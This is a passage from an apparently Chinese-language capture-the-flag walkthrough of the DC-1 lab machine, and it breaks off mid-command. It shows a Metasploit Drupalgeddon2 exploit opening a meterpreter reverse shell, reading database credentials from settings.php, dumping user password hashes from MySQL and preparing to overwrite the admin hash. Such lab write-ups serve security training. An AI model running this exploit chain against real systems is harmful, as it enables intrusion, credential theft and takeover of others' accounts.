+</span></span><span class=line><span class=cl><span class=p>|</span>_  /user/: Potentially interesting folder
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:99:02:5C <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 196.14 seconds
+</span></span></code></pre></td></tr></table></div></div><p>尝试sqlmap 一把梭无果，决定启动msf</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>msf &gt; search Drupal
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
+</span></span><span class=line><span class=cl><span class=o>================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   <span class=c1>#   Name                                                              Disclosure Date  Rank       Check  Description</span>
+</span></span><span class=line><span class=cl>   -   ----                                                              ---------------  ----       -----  -----------
+</span></span><span class=line><span class=cl>   <span class=m>0</span>   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+</span></span><span class=line><span class=cl>   <span class=m>1</span>   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon <span class=m>2</span> Forms API Property Injection
+</span></span><span class=line><span class=cl>   <span class=m>2</span>     <span class=se>\_</span> target: Automatic <span class=o>(</span>PHP In-Memory<span class=o>)</span>                            .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>3</span>     <span class=se>\_</span> target: Automatic <span class=o>(</span>PHP Dropper<span class=o>)</span>                              .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>4</span>     <span class=se>\_</span> target: Automatic <span class=o>(</span>Unix In-Memory<span class=o>)</span>                           .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>5</span>     <span class=se>\_</span> target: Automatic <span class=o>(</span>Linux Dropper<span class=o>)</span>                            .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>6</span>     <span class=se>\_</span> target: Drupal 7.x <span class=o>(</span>PHP In-Memory<span class=o>)</span>                           .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>7</span>     <span class=se>\_</span> target: Drupal 7.x <span class=o>(</span>PHP Dropper<span class=o>)</span>                             .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>8</span>     <span class=se>\_</span> target: Drupal 7.x <span class=o>(</span>Unix In-Memory<span class=o>)</span>                          .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>9</span>     <span class=se>\_</span> target: Drupal 7.x <span class=o>(</span>Linux Dropper<span class=o>)</span>                           .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>10</span>    <span class=se>\_</span> target: Drupal 8.x <span class=o>(</span>PHP In-Memory<span class=o>)</span>                           .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>11</span>    <span class=se>\_</span> target: Drupal 8.x <span class=o>(</span>PHP Dropper<span class=o>)</span>                             .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>12</span>    <span class=se>\_</span> target: Drupal 8.x <span class=o>(</span>Unix In-Memory<span class=o>)</span>                          .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>13</span>    <span class=se>\_</span> target: Drupal 8.x <span class=o>(</span>Linux Dropper<span class=o>)</span>                           .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>14</span>    <span class=se>\_</span> AKA: SA-CORE-2018-002                                        .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>15</span>    <span class=se>\_</span> AKA: Drupalgeddon <span class=m>2</span>                                          .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>16</span>  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+</span></span><span class=line><span class=cl>   <span class=m>17</span>    <span class=se>\_</span> target: Drupal 7.0 - 7.31 <span class=o>(</span>form-cache PHP injection method<span class=o>)</span>  .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>18</span>    <span class=se>\_</span> target: Drupal 7.0 - 7.31 <span class=o>(</span>user-post PHP injection method<span class=o>)</span>   .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>19</span>  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+</span></span><span class=line><span class=cl>   <span class=m>20</span>  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+</span></span><span class=line><span class=cl>   <span class=m>21</span>  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize<span class=o>()</span> RCE
+</span></span><span class=line><span class=cl>   <span class=m>22</span>    <span class=se>\_</span> target: PHP In-Memory                                        .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>23</span>    <span class=se>\_</span> target: Unix In-Memory                                       .                .          .      .
+</span></span><span class=line><span class=cl>   <span class=m>24</span>  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+</span></span><span class=line><span class=cl>   <span class=m>25</span>  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 25, use <span class=m>25</span> or use exploit/unix/webapp/php_xmlrpc_eval
+</span></span></code></pre></td></tr></table></div></div><p>挨个尝试并检查</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>msf &gt; use <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>unix/webapp/drupal_drupalgeddon2<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 10.10.10.131
+</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 10.10.10.131
+</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>unix/webapp/drupal_drupalgeddon2<span class=o>)</span> &gt; check
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.10.131:80 - The service is running, but could not be validated. Detected version <span class=m>7</span>
+</span></span><span class=line><span class=cl>msf exploit<span class=o>(</span>unix/webapp/drupal_drupalgeddon2<span class=o>)</span> &gt; run
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.10.10:4444 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Running automatic check <span class=o>(</span><span class=s2>&#34;set AutoCheck false&#34;</span> to disable<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> The service is running, but could not be validated. Detected version <span class=m>7</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending stage <span class=o>(</span><span class=m>45739</span> bytes<span class=o>)</span> to 10.10.10.131
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Meterpreter session <span class=m>1</span> opened <span class=o>(</span>10.10.10.10:4444 -&gt; 10.10.10.131:40053<span class=o>)</span> at 2026-07-18 16:13:01 -0400 
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取shell并升级为交互shell并且获得flag1>获取shell并升级为交互shell并且获得flag1</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>meterpreter &gt; shell
+</span></span><span class=line><span class=cl>Process <span class=m>3421</span> created.
+</span></span><span class=line><span class=cl>Channel <span class=m>0</span> created.
+</span></span><span class=line><span class=cl>python -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class=line><span class=cl>www-data@DC-1:/var/www$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>COPYRIGHT.txt       LICENSE.txt      cron.php     misc        sites
+</span></span><span class=line><span class=cl>INSTALL.mysql.txt   MAINTAINERS.txt  flag1.txt    modules     themes
+</span></span><span class=line><span class=cl>INSTALL.pgsql.txt   README.txt       includes     profiles    update.php
+</span></span><span class=line><span class=cl>INSTALL.sqlite.txt  UPGRADE.txt      index.php    robots.txt  web.config
+</span></span><span class=line><span class=cl>INSTALL.txt         authorize.php    install.php  scripts     xmlrpc.php
+</span></span><span class=line><span class=cl>www-data@DC-1:/var/www$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 188K
+</span></span><span class=line><span class=cl><span class=m>151901</span> drwxr-xr-x  <span class=m>9</span> www-data www-data 4.0K Feb <span class=m>19</span>  <span class=m>2019</span> .
+</span></span><span class=line><span class=cl>    <span class=m>12</span> drwxr-xr-x <span class=m>12</span> root     root     4.0K Feb <span class=m>19</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl><span class=m>152291</span> -rw-r--r--  <span class=m>1</span> www-data www-data  <span class=m>174</span> Nov <span class=m>21</span>  <span class=m>2013</span> .gitignore
+</span></span><span class=line><span class=cl><span class=m>152292</span> -rw-r--r--  <span class=m>1</span> www-data www-data 5.7K Nov <span class=m>21</span>  <span class=m>2013</span> .htaccess
+</span></span><span class=line><span class=cl><span class=m>153097</span> -rw-r--r--  <span class=m>1</span> www-data www-data 1.5K Nov <span class=m>21</span>  <span class=m>2013</span> COPYRIGHT.txt
+</span></span><span class=line><span class=cl><span class=m>152080</span> -rw-r--r--  <span class=m>1</span> www-data www-data 1.5K Nov <span class=m>21</span>  <span class=m>2013</span> INSTALL.mysql.txt
+</span></span><span class=line><span class=cl><span class=m>152079</span> -rw-r--r--  <span class=m>1</span> www-data www-data 1.9K Nov <span class=m>21</span>  <span class=m>2013</span> INSTALL.pgsql.txt
+</span></span><span class=line><span class=cl><span class=m>151903</span> -rw-r--r--  <span class=m>1</span> www-data www-data 1.3K Nov <span class=m>21</span>  <span class=m>2013</span> INSTALL.sqlite.txt
+</span></span><span class=line><span class=cl><span class=m>152050</span> -rw-r--r--  <span class=m>1</span> www-data www-data  18K Nov <span class=m>21</span>  <span class=m>2013</span> INSTALL.txt
+</span></span><span class=line><span class=cl><span class=m>152290</span> -rwxr-xr-x  <span class=m>1</span> www-data www-data  18K Nov  <span class=m>1</span>  <span class=m>2013</span> LICENSE.txt
+</span></span><span class=line><span class=cl><span class=m>151905</span> -rw-r--r--  <span class=m>1</span> www-data www-data 8.0K Nov <span class=m>21</span>  <span class=m>2013</span> MAINTAINERS.txt
+</span></span><span class=line><span class=cl><span class=m>151904</span> -rw-r--r--  <span class=m>1</span> www-data www-data 5.3K Nov <span class=m>21</span>  <span class=m>2013</span> README.txt
+</span></span><span class=line><span class=cl><span class=m>152277</span> -rw-r--r--  <span class=m>1</span> www-data www-data 9.5K Nov <span class=m>21</span>  <span class=m>2013</span> UPGRADE.txt
+</span></span><span class=line><span class=cl><span class=m>152276</span> -rw-r--r--  <span class=m>1</span> www-data www-data 6.5K Nov <span class=m>21</span>  <span class=m>2013</span> authorize.php
+</span></span><span class=line><span class=cl><span class=m>152051</span> -rw-r--r--  <span class=m>1</span> www-data www-data  <span class=m>720</span> Nov <span class=m>21</span>  <span class=m>2013</span> cron.php
+</span></span><span class=line><span class=cl><span class=m>150800</span> -rw-r--r--  <span class=m>1</span> www-data www-data   <span class=m>52</span> Feb <span class=m>19</span>  <span class=m>2019</span> flag1.txt
+</span></span><span class=line><span class=cl><span class=m>152201</span> drwxr-xr-x  <span class=m>4</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> includes
+</span></span><span class=line><span class=cl><span class=m>152052</span> -rw-r--r--  <span class=m>1</span> www-data www-data  <span class=m>529</span> Nov <span class=m>21</span>  <span class=m>2013</span> index.php
+</span></span><span class=line><span class=cl><span class=m>151902</span> -rw-r--r--  <span class=m>1</span> www-data www-data  <span class=m>703</span> Nov <span class=m>21</span>  <span class=m>2013</span> install.php
+</span></span><span class=line><span class=cl><span class=m>151919</span> drwxr-xr-x  <span class=m>4</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> misc
+</span></span><span class=line><span class=cl><span class=m>152293</span> drwxr-xr-x <span class=m>42</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> modules
+</span></span><span class=line><span class=cl><span class=m>152053</span> drwxr-xr-x  <span class=m>5</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> profiles
+</span></span><span class=line><span class=cl><span class=m>152289</span> -rw-r--r--  <span class=m>1</span> www-data www-data 1.6K Nov <span class=m>21</span>  <span class=m>2013</span> robots.txt
+</span></span><span class=line><span class=cl><span class=m>151907</span> drwxr-xr-x  <span class=m>2</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> scripts
+</span></span><span class=line><span class=cl><span class=m>152279</span> drwxr-xr-x  <span class=m>4</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> sites
+</span></span><span class=line><span class=cl><span class=m>152081</span> drwxr-xr-x  <span class=m>7</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> themes
+</span></span><span class=line><span class=cl><span class=m>152200</span> -rw-r--r--  <span class=m>1</span> www-data www-data  20K Nov <span class=m>21</span>  <span class=m>2013</span> update.php
+</span></span><span class=line><span class=cl><span class=m>152078</span> -rw-r--r--  <span class=m>1</span> www-data www-data 2.2K Nov <span class=m>21</span>  <span class=m>2013</span> web.config
+</span></span><span class=line><span class=cl><span class=m>151906</span> -rw-r--r--  <span class=m>1</span> www-data www-data  <span class=m>417</span> Nov <span class=m>21</span>  <span class=m>2013</span> xmlrpc.php
+</span></span><span class=line><span class=cl>www-data@DC-1:/var/www$ cat flag1.txt
+</span></span><span class=line><span class=cl>cat flag1.txt
+</span></span><span class=line><span class=cl>Every good CMS needs a config file - and so <span class=k>do</span> you.
+</span></span><span class=line><span class=cl>www-data@DC-1:/var/www$ 
+</span></span></code></pre></td></tr></table></div></div><p>flag1藏着提示，接下来我们需要找到这个cms的config</p><p>注意到有个sites 文件夹寻找一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@DC-1:/var/www$ <span class=nb>cd</span> sites                                                                 
+</span></span><span class=line><span class=cl><span class=nb>cd</span> sites
+</span></span><span class=line><span class=cl>www-data@DC-1:/var/www/sites$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 24K
+</span></span><span class=line><span class=cl><span class=m>152279</span> drwxr-xr-x <span class=m>4</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> .
+</span></span><span class=line><span class=cl><span class=m>151901</span> drwxr-xr-x <span class=m>9</span> www-data www-data 4.0K Feb <span class=m>19</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl><span class=m>152280</span> -rw-r--r-- <span class=m>1</span> www-data www-data  <span class=m>904</span> Nov <span class=m>21</span>  <span class=m>2013</span> README.txt
+</span></span><span class=line><span class=cl><span class=m>152284</span> drwxr-xr-x <span class=m>4</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> all
+</span></span><span class=line><span class=cl><span class=m>152282</span> dr-xr-xr-x <span class=m>3</span> www-data www-data 4.0K Feb <span class=m>19</span>  <span class=m>2019</span> default
+</span></span><span class=line><span class=cl><span class=m>152281</span> -rw-r--r-- <span class=m>1</span> www-data www-data 2.4K Nov <span class=m>21</span>  <span class=m>2013</span> example.sites.php
+</span></span><span class=line><span class=cl>www-data@DC-1:/var/www/sites$ <span class=nb>cd</span> default
+</span></span><span class=line><span class=cl><span class=nb>cd</span> default
+</span></span><span class=line><span class=cl>www-data@DC-1:/var/www/sites/default$ ls -liah
+</span></span><span class=line><span class=cl>ls -liah
+</span></span><span class=line><span class=cl>total 52K
+</span></span><span class=line><span class=cl><span class=m>152282</span> dr-xr-xr-x <span class=m>3</span> www-data www-data 4.0K Feb <span class=m>19</span>  <span class=m>2019</span> .
+</span></span><span class=line><span class=cl><span class=m>152279</span> drwxr-xr-x <span class=m>4</span> www-data www-data 4.0K Nov <span class=m>21</span>  <span class=m>2013</span> ..
+</span></span><span class=line><span class=cl><span class=m>152283</span> -rw-r--r-- <span class=m>1</span> www-data www-data  23K Nov <span class=m>21</span>  <span class=m>2013</span> default.settings.php
+</span></span><span class=line><span class=cl><span class=m>150709</span> drwxrwxr-x <span class=m>3</span> www-data www-data 4.0K Feb <span class=m>19</span>  <span class=m>2019</span> files
+</span></span><span class=line><span class=cl><span class=m>150704</span> -r--r--r-- <span class=m>1</span> www-data www-data  16K Feb <span class=m>19</span>  <span class=m>2019</span> settings.php
+</span></span></code></pre></td></tr></table></div></div><h2 id=找到了并读取寻找关键信息获得flag2>找到了并读取寻找关键信息获得flag2</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@DC-1:/var/www/sites/default$ cat settings.php
+</span></span><span class=line><span class=cl>&lt;?php                             
+</span></span><span class=line><span class=cl>/**                                                   
+</span></span><span class=line><span class=cl> *                                                
+</span></span><span class=line><span class=cl> * flag2            
+</span></span><span class=line><span class=cl> * Brute force and dictionary attacks aren<span class=s1>&#39;t the     
+</span></span></span><span class=line><span class=cl><span class=s1> * only ways to gain access (and you WILL need access).               
+</span></span></span><span class=line><span class=cl><span class=s1> * What can you do with these credentials?
+</span></span></span><span class=line><span class=cl><span class=s1> *                                                  
+</span></span></span><span class=line><span class=cl><span class=s1> */        
+</span></span></span><span class=line><span class=cl><span class=s1>$databases = array (                                         
+</span></span></span><span class=line><span class=cl><span class=s1>  &#39;</span>default<span class=s1>&#39; =&gt;                                            
+</span></span></span><span class=line><span class=cl><span class=s1>  array (                                       
+</span></span></span><span class=line><span class=cl><span class=s1>    &#39;</span>default<span class=s1>&#39; =&gt;                                       
+</span></span></span><span class=line><span class=cl><span class=s1>    array (                           
+</span></span></span><span class=line><span class=cl><span class=s1>      &#39;</span>database<span class=s1>&#39; =&gt; &#39;</span>drupaldb<span class=s1>&#39;,                          
+</span></span></span><span class=line><span class=cl><span class=s1>      &#39;</span>username<span class=s1>&#39; =&gt; &#39;</span>dbuser<span class=s1>&#39;,                            
+</span></span></span><span class=line><span class=cl><span class=s1>      &#39;</span>password<span class=s1>&#39; =&gt; &#39;</span>R0ck3t<span class=s1>&#39;,                              
+</span></span></span><span class=line><span class=cl><span class=s1>      &#39;</span>host<span class=s1>&#39; =&gt; &#39;</span>localhost<span class=s1>&#39;,                                   
+</span></span></span><span class=line><span class=cl><span class=s1>      &#39;</span>port<span class=s1>&#39; =&gt; &#39;&#39;,                              
+</span></span></span><span class=line><span class=cl><span class=s1>      &#39;</span>driver<span class=s1>&#39; =&gt; &#39;</span>mysql<span class=s1>&#39;,                                    
+</span></span></span><span class=line><span class=cl><span class=s1>      &#39;</span>prefix<span class=s1>&#39; =&gt; &#39;</span><span class=err>&#39;</span>,                                                  
+</span></span><span class=line><span class=cl>    <span class=o>)</span>,                   
+</span></span><span class=line><span class=cl>  <span class=o>)</span>,
+</span></span><span class=line><span class=cl><span class=o>)</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>提示：暴力破解和字典攻击不是获取访问权限的唯一方法（你肯定需要访问权限）。有了这些凭据你能做什么？</p><h2 id=登陆mysql>登陆MYSQL</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -pR0ck3t
+</span></span><span class=line><span class=cl>mysql -u dbuser -pR0ck3t
+</span></span><span class=line><span class=cl>Welcome to the MySQL monitor.  Commands end with <span class=p>;</span> or <span class=se>\g</span>.
+</span></span><span class=line><span class=cl>Your MySQL connection id is <span class=m>2436</span>
+</span></span><span class=line><span class=cl>Server version: 5.5.60-0+deb7u1 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Oracle is a registered trademark of Oracle Corporation and/or its
+</span></span><span class=line><span class=cl>affiliates. Other names may be trademarks of their respective
+</span></span><span class=line><span class=cl>owners.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Type <span class=s1>&#39;help;&#39;</span> or <span class=s1>&#39;\h&#39;</span> <span class=k>for</span> help. Type <span class=s1>&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>mysql&gt; use drupaldb<span class=p>;</span>
+</span></span><span class=line><span class=cl>use drupaldb<span class=p>;</span>
+</span></span><span class=line><span class=cl>Reading table information <span class=k>for</span> completion of table and column names
+</span></span><span class=line><span class=cl>You can turn off this feature to get a quicker startup with -A
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Database changed
+</span></span><span class=line><span class=cl>mysql&gt; <span class=k>select</span> name, pass from users<span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>select</span> name, pass from users<span class=p>;</span>
+</span></span><span class=line><span class=cl>+-------+---------------------------------------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> name  <span class=p>|</span> pass                                                    <span class=p>|</span>
+</span></span><span class=line><span class=cl>+-------+---------------------------------------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span>       <span class=p>|</span>                                                         <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> admin <span class=p>|</span> <span class=nv>$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> Fred  <span class=p>|</span> <span class=nv>$S$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg <span class=p>|</span>
+</span></span><span class=line><span class=cl>+-------+---------------------------------------------------------+
+</span></span><span class=line><span class=cl><span class=m>3</span> rows in <span class=nb>set</span> <span class=o>(</span>0.01 sec<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>获取到了哈希密码</p><p>先退出 MySQL（输入 <code>exit</code> 回到 Shell），然后执行 Drupal 自带的密码脚本(要先切换到www目录)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>php /var/www/scripts/password-hash.sh <span class=m>123456</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@DC-1:/var/www$ php /var/www/scripts/password-hash.sh <span class=m>123456</span>
+</span></span><span class=line><span class=cl>php /var/www/scripts/password-hash.sh <span class=m>123456</span>
+</span></span><span class=line><span class=cl>password: <span class=m>123456</span>                hash: <span class=nv>$S$DsDCtVFLMdMUZ3yHMnlkatK2yJ8NJu99z93EFSUtLx709Y9MkhgD</span>
+</span></span><span class=line><span class=cl>www-data@DC-1:/var/www$ 
+</span></span></code></pre></td></tr></table></div></div><p>复制获得的hash</p><h2 id=重新登陆这个mysql替换原来的hash密码>重新登陆这个MYSQL替换原来的hash密码</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@DC-1:/var/www$ mysql -u dbuser -pR0ck3t                        
